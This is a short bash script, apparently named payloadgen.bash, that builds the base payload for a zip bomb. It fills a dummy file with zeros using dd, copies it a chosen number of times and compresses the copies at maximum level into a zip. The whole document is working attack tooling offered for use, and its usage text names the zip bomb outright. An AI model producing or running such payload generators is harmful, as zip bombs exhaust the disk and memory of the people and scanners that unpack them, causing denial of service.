#!/bin/bash

UNITSIZE=$1
COPIES=$2

OLDPATH=$PATH
PATH=$(/usr/bin/getconf PATH)

if [[ $# -lt 2 ]] then
    printf "USAGE: payloadgen.bash [UNIT SIZE] [COPIES]\n\n";
    printf "Generates a zip file as a payload for a zip-bomb\n";
    printf "   UNIT SIZE            Size of the unit dummy file inside the payload\n";
    printf "   COPIES               Specifies how many dummy files the payload should contain\n";
    exit 0
fi

## Generate a file filled with [UNITSIZE] number of zeros. Each 0 in it is a
## byte, so if it's filled with 1000 zeros, it'll be 1.0kB in size
$(which dd) if=/dev/zero of=./dummyfile.tmp bs=1 count=$UNITSIZE


## Now build the first layer:
for i in $(seq 1 $COPIES); do cp ./dummyfile.tmp ./dummyfile$i.tmp; done

## Zip the base layer together and assign that as the base unit zip file:
zip -9 dummy.zip ./dummyfile*.tmp
rm ./dummyfile*.tmp

mv ./dummy.zip ./payload_$COPIES.zip

printf "Payload size: $(du -h ./payload_$COPIES.zip)\n" 1>&2;

## Restoring the PATH variable to normal;
PATH=$OLDPATH
